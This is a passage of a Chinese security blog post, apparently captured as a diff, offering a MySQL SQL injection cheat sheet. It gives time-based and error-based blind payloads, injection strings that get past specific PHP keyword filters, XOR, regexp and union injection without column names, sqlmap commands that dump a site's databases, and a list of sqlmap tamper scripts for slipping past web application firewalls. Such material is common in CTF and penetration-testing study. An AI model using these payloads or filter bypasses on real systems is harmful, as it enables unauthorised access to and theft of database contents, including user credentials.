+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line">等价于：</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+<h3 id="常见Bypass"><a href="#常见Bypass" class="headerlink" title="常见Bypass"></a>常见Bypass</h3><blockquote>
+<p>PHP中一些常见的过滤方法及绕过方式</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match('/(and|or)/i',$id)</span><br><span class="line">会过滤的攻击代码    1 or 1=1 1 and 1=1</span><br><span class="line">绕过方式    1 || 1=1 1 &amp;&amp; 1=1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match('/(and|or|union)/i',$id)</span><br><span class="line">会过滤的攻击代码    union <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> userid=<span class="number">1</span>)=<span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span><span class="comment">#user_id聚合中user_id为1的user为admin</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit|group by)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> ) = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where|limit|group by|select)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">'</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">')/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; user_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x61</span> <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">unhex</span>(<span class="number">61</span>)</span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) <span class="comment">#十进制的11转化为十六进制，并小写。</span></span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex, substr</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex|substr)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">substr</span>(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) = <span class="keyword">lower</span>(<span class="keyword">conv</span>(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>))/td&gt;</span><br><span class="line">绕过方式    <span class="number">1</span> &amp;&amp; <span class="keyword">lpad</span>(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span>, <span class="keyword">or</span>, <span class="keyword">union</span>, <span class="keyword">where</span>, <span class="keyword">limit</span>, <span class="keyword">group</span> <span class="keyword">by</span>, <span class="keyword">select</span>, <span class="string">', hex, substr, 空格</span></span><br><span class="line"><span class="string">php代码    preg_match('</span>/(<span class="keyword">and</span>|<span class="keyword">or</span>|<span class="keyword">union</span>|<span class="keyword">where</span>|<span class="keyword">limit</span>|<span class="keyword">group</span> <span class="keyword">by</span>|<span class="keyword">select</span>|\<span class="string">'|hex|substr|\s)/i'</span>, $<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> &amp;&amp; <span class="keyword">lpad</span>(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)/td&gt;</span><br><span class="line">绕过方式    <span class="number">1</span>%<span class="number">0</span>b||%<span class="number">0</span>blpad(<span class="keyword">user</span>,<span class="number">7</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">过滤关键字    <span class="keyword">and</span> <span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">where</span></span><br><span class="line">php代码    preg_match(<span class="string">'/(and|or|union|where)/i'</span>,$<span class="keyword">id</span>)</span><br><span class="line">会过滤的攻击代码    <span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br><span class="line">绕过方式    <span class="number">1</span> || (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="各种骚姿势一把梭"><a href="#各种骚姿势一把梭" class="headerlink" title="各种骚姿势一把梭"></a>各种骚姿势一把梭</h2><h3 id="update、insert、delete注入"><a href="#update、insert、delete注入" class="headerlink" title="update、insert、delete注入"></a>update、insert、delete注入</h3><p><a href="https://www.anquanke.com/post/id/85487" target="_blank" rel="noopener">MySQL下Update、Insert注入方法</a></p>
+<br>
+
+<h3 id="pow溢出报错"><a href="#pow溢出报错" class="headerlink" title="pow溢出报错"></a>pow溢出报错</h3><p>pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">pow</span>(<span class="number">2</span>,<span class="number">2222222222222222222</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>过滤了延时语句，正常页面与错误页面没有区别，当sql语句出错时会返回自定义的错误页面。</p>
+</blockquote>
+<br>
+
+<h3 id="XOR注入"><a href="#XOR注入" class="headerlink" title="XOR注入"></a>XOR注入</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin'^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23</span><br><span class="line">或者</span><br><span class="line">admin'^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>过滤了关键字：and、or<br>过滤了逗号，<br>过滤了空格</p>
+</blockquote>
+<br>
+
+<h3 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span>语句) regexp <span class="string">'正则'</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>过滤了=、in、like</p>
+</blockquote>
+<br>
+
+<h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h3><p>暂略</p>
+<br>
+
+<h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p><a href="https://xz.aliyun.com/t/4105" target="_blank" rel="noopener">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">`4`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>)<span class="comment">-- -</span></span><br><span class="line">需要注意字段数，以及回显的地方，以及要查询的东西</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>适用于：数据泄露或者过滤关键字段名的一把梭</p>
+</blockquote>
+<br>
+
+<br>
+
+<h1 id="sqlmap一把梭"><a href="#sqlmap一把梭" class="headerlink" title="sqlmap一把梭"></a>sqlmap一把梭</h1><h2 id="基础指令一把梭"><a href="#基础指令一把梭" class="headerlink" title="基础指令一把梭"></a>基础指令一把梭</h2><p><strong>URL直接注入</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> --dbs</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx -T xxx --columns</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"www.xxx.com?id=1"</span> -D xxx -T xxx -C xxx --dump</span><br></pre></td></tr></table></figure>
+
+<p><strong>从文件中加载HTTP请求</strong><br>先从burpsuite Copt to file 然后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -r <span class="string">"选择你保存的文件的路径"</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>适用于：cookie，POST数据等</p>
+</blockquote>
+<br>
+
+<h2 id="tamper一把梭"><a href="#tamper一把梭" class="headerlink" title="tamper一把梭"></a>tamper一把梭</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</span><br><span class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</span><br><span class="line">appendnullbyte.py 在payload末尾添加空字符编码</span><br><span class="line">base64encode.py 对给定的payload全部字符使用Base64编码</span><br><span class="line">between.py 分别用“NOT BETWEEN 0 AND <span class="comment">#”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</span></span><br><span class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</span><br><span class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</span><br><span class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</span><br><span class="line">equaltolike.py 用“LIKE”运算符替换全部等于号“=”</span><br><span class="line">greatest.py 用“GREATEST”函数替换大于号“&gt;”</span><br><span class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</span><br><span class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</span><br><span class="line">lowercase.py 用小写值替换每个关键字字符</span><br><span class="line">modsecurityversioned.py 用注释包围完整的查询</span><br><span class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</span><br><span class="line">multiplespaces.py 在SQL关键字周围添加多个空格</span><br><span class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</span><br><span class="line">overlongutf8.py 转换给定的payload当中的所有字符</span><br><span class="line">percentage.py 在每个字符之前添加一个百分号</span><br><span class="line">randomcase.py 随机转换每个关键字字符的大小写</span><br><span class="line">randomcomments.py 向SQL关键字中插入随机注释</span><br><span class="line">securesphere.py 添加经过特殊构造的字符串</span><br><span class="line">sp_password.py 向payload末尾添加“sp_password” <span class="keyword">for</span> automatic obfuscation from DBMS logs</span><br><span class="line">space2comment.py 用“/**/”替换空格符</span><br><span class="line">space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符</span><br><span class="line">space2hash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2morehash.py 用磅注释符“<span class="comment">#”其次是一个随机字符串和一个换行符替换空格符</span></span><br><span class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mssqlhash.py 用磅注释符“<span class="comment">#”其次是一个换行符替换空格符</span></span><br><span class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符</span><br><span class="line">space2plus.py 用加号“+”替换空格符</span><br><span class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</span><br><span class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</span><br><span class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</span><br><span class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</span><br><span class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</span><br><span class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</span><br><span class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<center><img src="http://a2.qpic.cn/psb?/V10Iej344PJUNc/WGjygp3zP*HGy5yJnHverk8N3OUAqogAk*u*kyzmu6w!/m/dFUBAAAAAAAAnull" width="100%"></center>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>P2hm1n</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://p2hm1n.github.io/2019/06/07/SQL注入一把梭/" title="SQL注入一把梭">https://p2hm1n.github.io/2019/06/07/SQL注入一把梭/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/SQL-Injection/" rel="tag"># SQL Injection</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/12/DDCTF-2019-writeup/" rel="next" title="DDCTF 2019 Writeup">
+                <i class="fa fa-chevron-left"></i> DDCTF 2019 Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/09/ISCC-2019-Web-Writeup/" rel="prev" title="ISCC 2019 Web Writeup">
+                ISCC 2019 Web Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/lufei.jpg" alt="P2hm1n">
+            
+              <p class="site-author-name" itemprop="name">P2hm1n</p>
+              <div class="site-description motion-element" itemprop="description">ONE PIECE</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/P2hm1n" title="GitHub &rarr; https://github.com/P2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="/qq7832919@gmail.com" title="E-Mail &rarr; qq7832919@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/p2hm1n" title="Twitter &rarr; https://twitter.com/p2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql一把梭"><span class="nav-number">1.</span> <span class="nav-text">Mysql一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用命令一把梭"><span class="nav-number">1.1.</span> <span class="nav-text">常用命令一把梭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UNION注入一把梭"><span class="nav-number">1.2.</span> <span class="nav-text">UNION注入一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UNION注入"><span class="nav-number">1.2.1.</span> <span class="nav-text">UNION注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UNION-JOIN-注入"><span class="nav-number">1.2.2.</span> <span class="nav-text">UNION + JOIN 注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入一把梭"><span class="nav-number">1.3.</span> <span class="nav-text">报错注入一把梭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#时间，布尔盲注一把梭"><span class="nav-number">1.4.</span> <span class="nav-text">时间，布尔盲注一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#时间"><span class="nav-number">1.4.1.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#布尔"><span class="nav-number">1.4.2.</span> <span class="nav-text">布尔</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bypass一把梭"><span class="nav-number">1.5.</span> <span class="nav-text">Bypass一把梭</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤空格"><span class="nav-number">1.5.1.</span> <span class="nav-text">过滤空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤逗号"><span class="nav-number">1.5.2.</span> <span class="nav-text">过滤逗号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤比较符号"><span 